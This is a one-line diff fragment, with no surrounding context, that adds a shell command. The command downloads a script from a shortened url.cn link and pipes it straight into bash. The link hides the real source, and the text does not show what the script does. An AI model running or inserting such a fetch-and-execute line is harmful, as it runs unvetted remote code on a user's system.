@@ -1,0 +1,1 @@
+bash <(curl -Ls http://url.cn/4CIc8M7)
